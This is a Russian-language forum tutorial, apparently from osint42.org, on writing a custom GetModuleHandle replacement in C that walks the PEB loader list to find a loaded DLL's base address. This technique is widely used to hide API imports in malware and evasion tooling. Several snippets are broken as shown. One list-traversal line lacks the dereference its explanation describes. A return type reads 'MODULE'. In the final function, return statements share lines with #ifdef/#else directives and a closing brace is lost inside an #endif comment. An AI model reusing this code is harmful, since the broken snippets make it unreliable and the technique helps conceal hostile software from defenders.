–°–æ–≥–ª–∞—Å–Ω–æ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—é Microsoft –¥–ª—è —á–ª–µ–Ω–∞ InMemoryOrderModuleList, —É–∫–∞–∑—ã–≤–∞–µ—Ç—Å—è, —á—Ç–æ –∫–∞–∂–¥—ã–π —ç–ª–µ–º–µ–Ω—Ç –≤ —Å–ø–∏—Å–∫–µ —è–≤–ª—è–µ—Ç—Å—è —É–∫–∞–∑–∞—Ç–µ–ª–µ–º –Ω–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä—É LDR_DATA_TABLE_ENTRY.<br />
<br />
<b>–°—Ç—Ä—É–∫—Ç—É—Ä–∞ LDR_DATA_TABLE_ENTRY</b><br />
 <br />
–°—Ç—Ä—É–∫—Ç—É—Ä–∞ LDR_DATA_TABLE_ENTRY –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π DLL –≤–Ω—É—Ç—Ä–∏ —Å–≤—è–∑–∞–Ω–Ω–æ–≥–æ —Å–ø–∏—Å–∫–∞ –∑–∞–≥—Ä—É–∂–µ–Ω–Ω—ã—Ö DLL –¥–ª—è –ø—Ä–æ—Ü–µ—Å—Å–∞. –ö–∞–∂–¥—ã–π LDR_DATA_TABLE_ENTRY –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π —É–Ω–∏–∫–∞–ª—å–Ω—É—é DLL.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _LDR_DATA_TABLE_ENTRY {
PVOID Reserved1[2];
LIST_ENTRY InMemoryOrderLinks; // –¥–≤—É—Å–≤—è–∑–Ω—ã–π —Å–ø–∏—Å–æ–∫, —Å–æ–¥–µ—Ä–∂–∞—â–∏–π –ø–æ—Ä—è–¥–æ–∫ –∑–∞–≥—Ä—É–∑–∫–∏ –º–æ–¥—É–ª–µ–π –≤ –ø–∞–º—è—Ç—å
PVOID Reserved2[2];
PVOID DllBase;
PVOID EntryPoint;
PVOID Reserved3;
UNICODE_STRING FullDllName; // —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ &#039;UNICODE_STRING&#039;, —Å–æ–¥–µ—Ä–∂–∞—â–∞—è –∏–º—è —Ñ–∞–π–ª–∞ –∑–∞–≥—Ä—É–∂–µ–Ω–Ω–æ–≥–æ –º–æ–¥—É–ª—è
BYTE Reserved4[8];
PVOID Reserved5[3];
union {
ULONG CheckSum;
PVOID Reserved6;
};
ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</code></pre>
	</div>
</div><br />
<b>–õ–æ–≥–∏–∫–∞ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏</b><br />
<br />
–ù–∞ –æ—Å–Ω–æ–≤–µ –≤—Å–µ–≥–æ –≤—ã—à–µ—É–ø–æ–º—è–Ω—É—Ç–æ–≥–æ —Ç—Ä–µ–±—É—é—Ç—Å—è —Å–ª–µ–¥—É—é—â–∏–µ –¥–µ–π—Å—Ç–≤–∏—è:<br />
<br />
1. –ò–∑–≤–ª–µ—á—å PEB<br />
2. –ò–∑–≤–ª–µ—á—å —á–ª–µ–Ω Ldr –∏–∑ PEB<br />
3. –ò–∑–≤–ª–µ—á—å –ø–µ—Ä–≤—ã–π —ç–ª–µ–º–µ–Ω—Ç –≤ —Å–≤—è–∑–∞–Ω–Ω–æ–º —Å–ø–∏—Å–∫–µ<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>HMODULE GetModuleHandleReplacement(IN LPCWSTR szModuleName) {

// –ü–æ–ª—É—á–µ–Ω–∏–µ peb
#ifdef _WIN64 // –µ—Å–ª–∏ –∫–æ–º–ø–∏–ª—è—Ü–∏—è –∫–∞–∫ x64
PPEB pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32 // –µ—Å–ª–∏ –∫–æ–º–ø–∏–ª—è—Ü–∏—è –∫–∞–∫ x32
PPEB pPeb = (PEB*)(__readfsdword(0x30));
#endif// –ü–æ–ª—É—á–µ–Ω–∏–µ Ldr
PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb-&gt;Ldr);

// –ü–æ–ª—É—á–µ–Ω–∏–µ –ø–µ—Ä–≤–æ–≥–æ —ç–ª–µ–º–µ–Ω—Ç–∞ –≤ —Å–≤—è–∑–∞–Ω–Ω–æ–º —Å–ø–∏—Å–∫–µ, –∫–æ—Ç–æ—Ä—ã–π —Å–æ–¥–µ—Ä–∂–∏—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–µ—Ä–≤–æ–º –º–æ–¥—É–ª–µ
PLDR_DATA_TABLE_ENTRY    pDte    = (PLDR_DATA_TABLE_ENTRY)(pLdr-&gt;InMemoryOrderModuleList.Flink);
}</code></pre>
	</div>
</div><br />
–ü–æ—Å–∫–æ–ª—å–∫—É –∫–∞–∂–¥—ã–π pDte –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π —É–Ω–∏–∫–∞–ª—å–Ω—É—é DLL –≤–Ω—É—Ç—Ä–∏ —Å–≤—è–∑–∞–Ω–Ω–æ–≥–æ —Å–ø–∏—Å–∫–∞, –≤–æ–∑–º–æ–∂–Ω–æ –ø–µ—Ä–µ–π—Ç–∏ –∫ —Å–ª–µ–¥—É—é—â–µ–º—É —ç–ª–µ–º–µ–Ω—Ç—É —Å –ø–æ–º–æ—â—å—é —Å–ª–µ–¥—É—é—â–µ–π —Å—Ç—Ä–æ–∫–∏ –∫–æ–¥–∞:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>pDte = (PLDR_DATA_TABLE_ENTRY)(pDte);</code></pre>
	</div>
</div><br />
–≠—Ç–∞ —Å—Ç—Ä–æ–∫–∞ –∫–æ–¥–∞ –º–æ–∂–µ—Ç –ø–æ–∫–∞–∑–∞—Ç—å—Å—è —Å–ª–æ–∂–Ω–æ–π, –Ω–æ –≤—Å–µ, —á—Ç–æ –æ–Ω–∞ –¥–µ–ª–∞–µ—Ç - —ç—Ç–æ —Ä–∞–∑—ã–º–µ–Ω–æ–≤—ã–≤–∞–µ—Ç –∑–Ω–∞—á–µ–Ω–∏–µ, —Ö—Ä–∞–Ω—è—â–µ–µ—Å—è –ø–æ –∞–¥—Ä–µ—Å—É, –Ω–∞ –∫–æ—Ç–æ—Ä—ã–π —É–∫–∞–∑—ã–≤–∞–µ—Ç pDte, –∞ –∑–∞—Ç–µ–º –ø—Ä–∏–≤–æ–¥–∏—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç –∫ —É–∫–∞–∑–∞—Ç–µ–ª—é –Ω–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä—É PLDR_DATA_TABLE_ENTRY. –≠—Ç–æ –ø—Ä–æ—Å—Ç–æ —Ç–∞–∫ —Ä–∞–±–æ—Ç–∞—é—Ç —Å–≤—è–∑–∞–Ω–Ω—ã–µ —Å–ø–∏—Å–∫–∏, —á—Ç–æ-—Ç–æ –≤—Ä–æ–¥–µ —Å–ª–µ–¥—É—é—â–µ–≥–æ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784848050.png"
		data-src="https://osint42.org/attachments/1746784848050-png.185/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784848050-png.185/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784848050.png"
			title="1746784848050.png"
			width="1078" height="322" loading="lazy" />
	</div><br />
<br />
<b>–ü–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏–µ DLL - –∫–æ–¥</b><br />
–ü—Ä–∏–≤–µ–¥–µ–Ω–Ω—ã–π –Ω–∏–∂–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞ –∏–∑–≤–ª–µ–∫–∞–µ—Ç –∏–º—è DLL, —É–∂–µ –∑–∞–≥—Ä—É–∂–µ–Ω–Ω—ã—Ö –≤ –≤—ã–∑—ã–≤–∞—é—â–∏–π –ø—Ä–æ—Ü–µ—Å—Å. –§—É–Ω–∫—Ü–∏—è –∏—â–µ—Ç —Ü–µ–ª–µ–≤–æ–π –º–æ–¥—É–ª—å, szModuleName. –ï—Å–ª–∏ —Å–æ–≤–ø–∞–¥–µ–Ω–∏–µ –Ω–∞–π–¥–µ–Ω–æ, —Ñ—É–Ω–∫—Ü–∏—è –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –∫ DLL (HMODULE), –≤ –ø—Ä–æ—Ç–∏–≤–Ω–æ–º —Å–ª—É—á–∞–µ - –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç NULL.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>MODULE GetModuleHandleReplacement(IN LPCWSTR szModuleName) {

// –ü–æ–ª—É—á–µ–Ω–∏–µ PEB
#ifdef _WIN64 // –µ—Å–ª–∏ –∫–æ–º–ø–∏–ª—è—Ü–∏—è –∫–∞–∫ x64
PPEB pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32 // –µ—Å–ª–∏ –∫–æ–º–ø–∏–ª—è—Ü–∏—è –∫–∞–∫ x32
PPEB pPeb = (PEB*)(__readfsdword(0x30));
#endif// –ü–æ–ª—É—á–µ–Ω–∏–µ Ldr
PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb-&gt;Ldr);

// –ü–æ–ª—É—á–µ–Ω–∏–µ –ø–µ—Ä–≤–æ–≥–æ —ç–ª–µ–º–µ–Ω—Ç–∞ –≤ —Å–≤—è–∑–∞–Ω–Ω–æ–º —Å–ø–∏—Å–∫–µ, –∫–æ—Ç–æ—Ä—ã–π —Å–æ–¥–µ—Ä–∂–∏—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–µ—Ä–≤–æ–º –º–æ–¥—É–ª–µ
PLDR_DATA_TABLE_ENTRY    pDte    = (PLDR_DATA_TABLE_ENTRY)(pLdr-&gt;InMemoryOrderModuleList.Flink);

while (pDte) {
    // –ï—Å–ª–∏ –Ω–µ null
    if (pDte-&gt;FullDllName.Length != NULL) {
           // –í—ã–≤–æ–¥ –∏–º–µ–Ω–∏ DLL
        wprintf(L&quot;[i] \&quot;%s\&quot; \n&quot;, pDte-&gt;FullDllName.Buffer);
    }
    else {
        break;
    }
    // –°–ª–µ–¥—É—é—â–∏–π —ç–ª–µ–º–µ–Ω—Ç –≤ —Å–≤—è–∑–∞–Ω–Ω–æ–º —Å–ø–∏—Å–∫–µ
    pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
}

return NULL;
}</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746784859105.png"
		data-src="https://osint42.org/attachments/1746784859105-png.186/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784859105-png.186/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784859105.png"
			title="1746784859105.png"
			width="1363" height="253" loading="lazy" />
	</div><br />
<br />
<b>–ß—É–≤—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∏–º–µ–Ω DLL –∫ —Ä–µ–≥–∏—Å—Ç—Ä—É</b><br />
<br />
–ò–∑—É—á–∏–≤ –≤—ã–≤–æ–¥, –º–æ–∂–Ω–æ –ª–µ–≥–∫–æ –∑–∞–º–µ—Ç–∏—Ç—å, —á—Ç–æ –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –∏–º–µ–Ω–∞ DLL –Ω–∞–ø–∏—Å–∞–Ω—ã –∑–∞–≥–ª–∞–≤–Ω—ã–º–∏ –±—É–∫–≤–∞–º–∏, –∞ –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ - –Ω–µ—Ç, —á—Ç–æ –≤–ª–∏—è–µ—Ç –Ω–∞ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –ø–æ–ª—É—á–µ–Ω–∏—è –±–∞–∑–æ–≤–æ–≥–æ –∞–¥—Ä–µ—Å–∞ DLL (HMODULE). –ù–∞–ø—Ä–∏–º–µ—Ä, –µ—Å–ª–∏ –∫—Ç–æ-—Ç–æ –∏—â–µ—Ç DLL KERNEL32.DLL –∏ –ø–µ—Ä–µ–¥–∞–µ—Ç Kernel32.DLL, —Ñ—É–Ω–∫—Ü–∏—è wcscmp –±—É–¥–µ—Ç —Ä–∞—Å—Å–º–∞—Ç—Ä–∏–≤–∞—Ç—å –æ–±–µ —Å—Ç—Ä–æ–∫–∏ –∫–∞–∫ —Ä–∞–∑–Ω—ã–µ.<br />
<br />
–ß—Ç–æ–±—ã —É—Å—Ç—Ä–∞–Ω–∏—Ç—å —ç—Ç—É –ø—Ä–æ–±–ª–µ–º—É, –±—ã–ª–∞ —Å–æ–∑–¥–∞–Ω–∞ –≤—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è IsStringEqual, –∫–æ—Ç–æ—Ä–∞—è –ø—Ä–∏–Ω–∏–º–∞–µ—Ç –¥–≤–µ —Å—Ç—Ä–æ–∫–∏, –ø—Ä–µ–æ–±—Ä–∞–∑—É–µ—Ç –∏—Ö –≤ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏–µ –≤ –Ω–∏–∂–Ω–µ–º —Ä–µ–≥–∏—Å—Ç—Ä–µ, –∞ –∑–∞—Ç–µ–º —Å—Ä–∞–≤–Ω–∏–≤–∞–µ—Ç –∏—Ö –≤ —ç—Ç–æ–º —Å–æ—Å—Ç–æ—è–Ω–∏–∏. –û–Ω–∞ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç true, –µ—Å–ª–∏ –æ–±–µ —Å—Ç—Ä–æ–∫–∏ —Ä–∞–≤–Ω—ã, –∏ false –≤ –ø—Ä–æ—Ç–∏–≤–Ω–æ–º —Å–ª—É—á–∞–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>BOOL IsStringEqual (IN LPCWSTR Str1, IN LPCWSTR Str2) {

WCHAR   lStr1    [MAX_PATH],
        lStr2    [MAX_PATH];

int        len1    = lstrlenW(Str1),
        len2    = lstrlenW(Str2);

int        i        = 0,
        j        = 0;

// –ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–ª–∏–Ω—ã. –ù–µ —Ö–æ—Ç–∏–º –ø–µ—Ä–µ–ø–æ–ª–Ω–∏—Ç—å –±—É—Ñ–µ—Ä—ã
if (len1 &gt;= MAX_PATH || len2 &gt;= MAX_PATH)
    return FALSE;

// –ü—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ Str1 –≤ —Å—Ç—Ä–æ–∫—É –≤ –Ω–∏–∂–Ω–µ–º —Ä–µ–≥–∏—Å—Ç—Ä–µ (lStr1)
for (i = 0; i &lt; len1; i++){
    lStr1[i] = (WCHAR)tolower(Str1[i]);
}
lStr1[i++] = L&#039;\0&#039;; // –∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ null

// –ü—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ Str2 –≤ —Å—Ç—Ä–æ–∫—É –≤ –Ω–∏–∂–Ω–µ–º —Ä–µ–≥–∏—Å—Ç—Ä–µ (lStr2)
for (j = 0; j &lt; len2; j++) {
    lStr2[j] = (WCHAR)tolower(Str2[j]);
}
lStr2[j++] = L&#039;\0&#039;; // –∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ null

// –°—Ä–∞–≤–Ω–µ–Ω–∏–µ —Å—Ç—Ä–æ–∫ –≤ –Ω–∏–∂–Ω–µ–º —Ä–µ–≥–∏—Å—Ç—Ä–µ
if (lstrcmpiW(lStr1, lStr2) == 0)
    return TRUE;

return FALSE;
}</code></pre>
	</div>
</div><br />
<b>–ë–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å DLL</b><br />
<br />
–ü–æ–ª—É—á–µ–Ω–∏–µ –±–∞–∑–æ–≤–æ–≥–æ –∞–¥—Ä–µ—Å–∞ DLL —Ç—Ä–µ–±—É–µ—Ç —Å—Å—ã–ª–∫–∏ –Ω–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä—É LDR_DATA_TABLE_ENTRY. –ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, –≤ –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω–æ–π –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–∏ Microsoft –æ—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç –±–æ–ª—å—à–∏–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç—ã —Å—Ç—Ä—É–∫—Ç—É—Ä—ã. –ü–æ—ç—Ç–æ–º—É, —á—Ç–æ–±—ã –ª—É—á—à–µ –ø–æ–Ω—è—Ç—å —Å—Ç—Ä—É–∫—Ç—É—Ä—É, <a href="https://www.nirsoft.net/kernel_struct/vista/index.html" target="_blank" class="link link--external" rel="noopener">–±—ã–ª –ø—Ä–æ–≤–µ–¥–µ–Ω –ø–æ–∏—Å–∫ —Å—Ç—Ä—É–∫—Ç—É—Ä —è–¥—Ä–∞ Windows Vista.</a> –†–µ–∑—É–ª—å—Ç–∞—Ç—ã –¥–ª—è —Å—Ç—Ä—É–∫—Ç—É—Ä—ã –º–æ–∂–Ω–æ –Ω–∞–π—Ç–∏ <a href="https://www.nirsoft.net/kernel_struct/vista/LDR_DATA_TABLE_ENTRY.html" target="_blank" class="link link--external" rel="noopener">–∑–¥–µ—Å—å.</a><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _LDR_DATA_TABLE_ENTRY {
LIST_ENTRY InLoadOrderLinks;
LIST_ENTRY InMemoryOrderLinks;
LIST_ENTRY InInitializationOrderLinks;
PVOID DllBase;
PVOID EntryPoint;
ULONG SizeOfImage;
UNICODE_STRING FullDllName;
UNICODE_STRING BaseDllName;
ULONG Flags;
WORD LoadCount;
WORD TlsIndex;
union {
LIST_ENTRY HashLinks;
struct {
PVOID SectionPointer;
ULONG CheckSum;
};
};
union {
ULONG TimeDateStamp;
PVOID LoadedImports;
};
PACTIVATION_CONTEXT EntryPointActivationContext;
PVOID PatchInformation;
LIST_ENTRY ForwarderLinks;
LIST_ENTRY ServiceTagLinks;
LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;</code></pre>
	</div>
</div><br />
<b>–ë–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å DLL</b> - —ç—Ç–æ InInitializationOrderLinks.Flink, —Ö–æ—Ç—è –∏–º—è —ç—Ç–æ–≥–æ –Ω–µ –ø—Ä–µ–¥–ø–æ–ª–∞–≥–∞–µ—Ç, –Ω–æ, <b><u>–∫ —Å–æ–∂–∞–ª–µ–Ω–∏—é, Microsoft –ª—é–±–∏—Ç —Å–±–∏–≤–∞—Ç—å —Å —Ç–æ–ª–∫—É –ª—é–¥–µ–π.</u></b> –°—Ä–∞–≤–Ω–∏–≤ —ç—Ç–æ—Ç —á–ª–µ–Ω —Å –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω–æ–π –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–µ–π Microsoft –ø–æ LDR_DATA_TABLE_ENTRY, –º–æ–∂–Ω–æ —É–≤–∏–¥–µ—Ç—å, —á—Ç–æ –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å DLL - —ç—Ç–æ –∑–∞—Ä–µ–∑–µ—Ä–≤–∏—Ä–æ–≤–∞–Ω–Ω—ã–π —ç–ª–µ–º–µ–Ω—Ç (Reserved2[0]).<br />
<br />
–° —ç—Ç–∏–º –≤ –≤–∏–¥—É, —Ñ—É–Ω–∫—Ü–∏—è-–∑–∞–º–µ–Ω–∏—Ç–µ–ª—å GetModuleHandle –º–æ–∂–µ—Ç –±—ã—Ç—å –∑–∞–≤–µ—Ä—à–µ–Ω–∞.<br />
<br />
<b>–§—É–Ω–∫—Ü–∏—è-–∑–∞–º–µ–Ω–∏—Ç–µ–ª—å GetModuleHandle</b><br />
<br />
GetModuleHandleReplacement - —ç—Ç–æ —Ñ—É–Ω–∫—Ü–∏—è, –∫–æ—Ç–æ—Ä–∞—è –∑–∞–º–µ–Ω—è–µ—Ç GetModuleHandle. –û–Ω–∞ –±—É–¥–µ—Ç –∏—Å–∫–∞—Ç—å –∑–∞–¥–∞–Ω–Ω–æ–µ –∏–º—è DLL, –∏ –µ—Å–ª–∏ –æ–Ω–æ –∑–∞–≥—Ä—É–∂–µ–Ω–æ –ø—Ä–æ—Ü–µ—Å—Å–æ–º, –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –∫ DLL.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HMODULE GetModuleHandleReplacement(IN LPCWSTR szModuleName) {

// –ü–æ–ª—É—á–µ–Ω–∏–µ PEB
#ifdef _WIN64 // –µ—Å–ª–∏ –∫–æ–º–ø–∏–ª—è—Ü–∏—è –∫–∞–∫ x64
PPEB pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32 // –µ—Å–ª–∏ –∫–æ–º–ø–∏–ª—è—Ü–∏—è –∫–∞–∫ x32
PPEB pPeb = (PEB*)(__readfsdword(0x30));
#endif// –ü–æ–ª—É—á–µ–Ω–∏–µ Ldr
PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb-&gt;Ldr);
// –ü–æ–ª—É—á–µ–Ω–∏–µ –ø–µ—Ä–≤–æ–≥–æ —ç–ª–µ–º–µ–Ω—Ç–∞ –≤ —Å–≤—è–∑–∞–Ω–Ω–æ–º —Å–ø–∏—Å–∫–µ (—Å–æ–¥–µ—Ä–∂–∏—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–µ—Ä–≤–æ–º –º–æ–¥—É–ª–µ)
PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr-&gt;InMemoryOrderModuleList.Flink);

while (pDte) {

    // –ï—Å–ª–∏ –Ω–µ null
    if (pDte-&gt;FullDllName.Length != NULL) {

        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ —Ä–∞–≤–µ–Ω—Å—Ç–≤–æ
        if (IsStringEqual(pDte-&gt;FullDllName.Buffer, szModuleName)) {
            wprintf(L&quot;[+] –ù–∞–π–¥–µ–Ω–∞ Dll \&quot;%s\&quot; \n&quot;, pDte-&gt;FullDllName.Buffer);
#ifdef LDR_DATA_TABLE_ENTRY return (HMODULE)(pDte-&gt;InInitializationOrderLinks.Flink);
#else return (HMODULE)pDte-&gt;Reserved2[0];
#endif // STRUCTS}

        // wprintf(L&quot;[i] \&quot;%s\&quot; \n&quot;, pDte-&gt;FullDllName.Buffer);
    }
    else {
        break;
    }

    // –°–ª–µ–¥—É—é—â–∏–π —ç–ª–µ–º–µ–Ω—Ç –≤ —Å–≤—è–∑–∞–Ω–Ω–æ–º —Å–ø–∏—Å–∫–µ
    pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);

}

return NULL;
}</code></pre>
	</div>
</div><br />
–û–¥–Ω–∞ —á–∞—Å—Ç—å –∫–æ–¥–∞, –∫–æ—Ç–æ—Ä–∞—è –Ω–µ –±—ã–ª–∞ –æ–±—ä—è—Å–Ω–µ–Ω–∞, –ø–æ–∫–∞–∑–∞–Ω–∞ –Ω–∏–∂–µ. –≠—Ç–∞ —á–∞—Å—Ç—å –∫–æ–¥–∞ –æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç, –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –ª–∏ –≤–µ—Ä—Å–∏—è —Å—Ç—Ä—É–∫—Ç—É—Ä—ã LDR_DATA_TABLE_ENTRY –æ—Ç Microsoft –∏–ª–∏ —Ç–∞, —á—Ç–æ –∏–∑ —Å—Ç—Ä—É–∫—Ç—É—Ä —è–¥—Ä–∞ Windows Vista. –í –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç —Ç–æ–≥–æ, –∫–∞–∫–∞—è –∏–∑ –Ω–∏—Ö –±—ã–ª–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∞, –∏–º—è —á–ª–µ–Ω–∞ –º–µ–Ω—è–µ—Ç—Å—è.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>#ifdef LDR_DATA_TABLE_ENTRY return (HMODULE)(pDte-&gt;InInitializationOrderLinks.Flink);
#else return (HMODULE)pDte-&gt;Reserved2[0];
#endif // STRUCTS</code></pre>
	</div>
</div><br />
<b>–î–µ–º–æ</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784884136.png"
		data-src="https://osint42.org/attachments/1746784884136-png.187/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784884136-png.187/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784884136.png"
			title="1746784884136.png"
			width="1108" height="535" loading="lazy" />
	</div><br />
<br />
